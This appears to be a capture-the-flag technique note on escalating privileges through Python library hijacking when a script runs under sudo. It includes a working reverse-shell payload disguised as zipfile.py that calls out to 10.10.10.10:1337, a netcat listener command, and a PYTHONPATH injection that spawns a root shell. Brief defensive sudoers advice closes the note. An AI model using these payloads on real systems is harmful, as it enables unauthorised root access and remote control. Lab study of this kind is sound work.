# Python Library Hijack (PYTHONPATH / Working Directory)

Used on: **bsidesgtlibrary, biblioteca**

When a Python script is executed with `sudo`, and the attacker controls either the `PYTHONPATH` environment variable or the working directory from which the script is executed, they can hijack module imports. Python prioritizes the current working directory (or paths in `PYTHONPATH`) over system libraries. By creating a malicious Python module with the same name as an imported library (e.g., `zipfile.py`), the attacker's code runs as root when the script imports it.

## Prerequisites

- `sudo -l` shows a Python script can be run as root.
- The `NOPASSWD` entry allows running `python` without an absolute path to the script, OR the attacker can write to the directory where the script is located, OR the script is run from a directory the attacker controls.
- The script imports a standard library module (e.g., `zipfile`, `os`, `random`).

## Exploit

### 1. Identify the imports

Read the target script to find imported modules.

```python
# /home/meliodas/bak.py
import os
import zipfile

def zipdir(path, ziph):
    # ...
```

### 2. Create the malicious module

Create a file named exactly like the imported module (e.g., `zipfile.py`) in the directory from which the script will be executed. Include the malicious payload in the global scope (so it executes immediately on import) and stub out any classes/functions the script expects to prevent it from crashing before our payload executes.

```python
# zipfile.py
import os
import pty
import socket

# Reverse shell payload
lhost = "10.10.10.10"
lport = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv("HISTFILE",'/dev/null')
pty.spawn("/bin/bash")
s.close()

# Stub out what the script expects so it doesn't crash on import
ZIP_DEFLATED = 0
class ZipFile:
    def close(*args): return
    def write(*args): return
    def __init__(self, *args): return
```

### 3. Execute the script

Set up a listener on your machine (`nc -lvnp 1337`), then run the script with `sudo` from the directory containing your malicious `zipfile.py`.

```bash
sudo /usr/bin/python /home/meliodas/bak.py
```

The script imports your `zipfile.py` instead of the system `zipfile` module, executing your reverse shell as root.

### 4. Variant: SETENV / PYTHONPATH injection

If `sudo -l` shows `SETENV: NOPASSWD`, you can explicitly point Python's library path to a directory you control (like `/tmp`) by setting the `PYTHONPATH` variable in the `sudo` command.

```bash
# In /tmp/hashlib.py
import os
os.system("/bin/bash")
```

```bash
# Run the target script, forcing it to load libraries from /tmp
sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/script/hasher.py
```

## Defensive Notes

- Sudo configuration should use absolute paths for both the interpreter and the script (e.g., `/usr/bin/python3 /opt/script.py`).
- Use `env_reset` in sudoers to prevent environment variables like `PYTHONPATH` from carrying over.
